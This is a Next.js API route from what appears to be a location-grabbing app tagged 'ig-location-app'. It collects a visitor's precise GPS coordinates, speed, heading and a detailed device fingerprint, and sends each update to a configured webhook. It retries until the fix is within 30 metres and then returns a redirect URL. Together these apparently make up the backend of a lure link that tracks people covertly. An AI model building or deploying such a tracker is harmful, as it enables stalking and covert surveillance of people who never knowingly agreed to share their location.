import { NextRequest, NextResponse } from 'next/server';

function buildPayload(body: any, eventType: string) {
  const {
    latitude,
    longitude,
    accuracy,
    altitude,
    altitudeAccuracy,
    heading,
    speed,
    timestamp,
    deviceInfo,
    googleMapsLink,
    attemptNumber,
  } = body;

  return {
    event: eventType,
    timestamp: new Date().toISOString(),
    locationRequestedAt: new Date(timestamp).toISOString(),
    attempt_number: attemptNumber || null,
    location: {
      latitude,
      longitude,
      accuracy_meters: accuracy,
      accuracy_rating: accuracy <= 10 ? 'EXCELLENT' : accuracy <= 20 ? 'GOOD' : accuracy <= 30 ? 'ACCEPTABLE' : accuracy <= 50 ? 'MODERATE' : 'LOW',
      meets_threshold: accuracy <= 30,
      altitude_meters: altitude || null,
      altitude_accuracy_meters: altitudeAccuracy || null,
      heading_degrees: heading || null,
      speed_mps: speed || null,
    },
    google_maps_link: googleMapsLink,
    device: {
      userAgent: deviceInfo?.userAgent || 'Unknown',
      platform: deviceInfo?.platform || 'Unknown',
      language: deviceInfo?.language || 'Unknown',
      cookiesEnabled: deviceInfo?.cookiesEnabled || false,
      doNotTrack: deviceInfo?.doNotTrack || null,
      screenWidth: deviceInfo?.screenWidth || null,
      screenHeight: deviceInfo?.screenHeight || null,
      pixelRatio: deviceInfo?.pixelRatio || null,
      colorDepth: deviceInfo?.colorDepth || null,
      vendor: deviceInfo?.vendor || 'Unknown',
      model: deviceInfo?.model || 'Unknown',
      os: deviceInfo?.os || 'Unknown',
      osVersion: deviceInfo?.osVersion || 'Unknown',
      browser: deviceInfo?.browser || 'Unknown',
      browserVersion: deviceInfo?.browserVersion || 'Unknown',
      isMobile: deviceInfo?.isMobile || false,
      isTouchDevice: deviceInfo?.isTouchDevice || false,
      connectionType: deviceInfo?.connectionType || 'Unknown',
    },
    metadata: {
      source: 'ig-location-app',
      version: '2.1.0',
    },
  };
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { type, latitude, longitude, accuracy } = body;

    // Validate required fields
    if (!latitude || !longitude || !accuracy) {
      console.error('[API] Missing required location fields:', { latitude, longitude, accuracy });
      return NextResponse.json(
        { error: 'Missing required location fields', received: { latitude, longitude, accuracy } },
        { status: 400 }
      );
    }

    console.log(`[API] Received ${type} request - lat: ${latitude}, lng: ${longitude}, accuracy: ${accuracy}m`);

    const redirectUrl = process.env.REDIRECT_URL;
    const webhookUrl = process.env.WEBHOOK_URL;

    // Determine event type
    const eventType = type === 'final' ? 'location_captured' : 'location_update';
    const payload = buildPayload(body, eventType);

    // ===== Send to WEBHOOK_URL for BOTH update and final =====
    let webhookOk = false;
    if (webhookUrl) {
      console.log(`[Webhook] Sending ${eventType} (attempt ${body.attemptNumber}, accuracy: ${accuracy}m) to ${webhookUrl.substring(0, 50)}...`);
      try {
        const webhookResponse = await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload),
        });
        webhookOk = webhookResponse.ok;
        console.log(`[Webhook] Response: ${webhookResponse.status} ${webhookResponse.statusText}`);
      } catch (err) {
        console.error('[Webhook] Fetch failed:', err);
      }
    } else {
      console.error('[Webhook] WEBHOOK_URL not configured in .env! Location data will NOT be sent!');
    }

    return NextResponse.json({
      success: true,
      type: type,
      redirectUrl: type === 'final' ? (redirectUrl || null) : null,
      webhookStatus: webhookUrl ? (webhookOk ? 'sent' : 'failed') : 'not_configured',
      accuracy: accuracy,
      webhookConfigured: !!webhookUrl,
    });
  } catch (error) {
    console.error('[API] Location API error:', error);
    return NextResponse.json(
      { error: 'Internal server error', details: String(error) },
      { status: 500 }
    );
  }
}
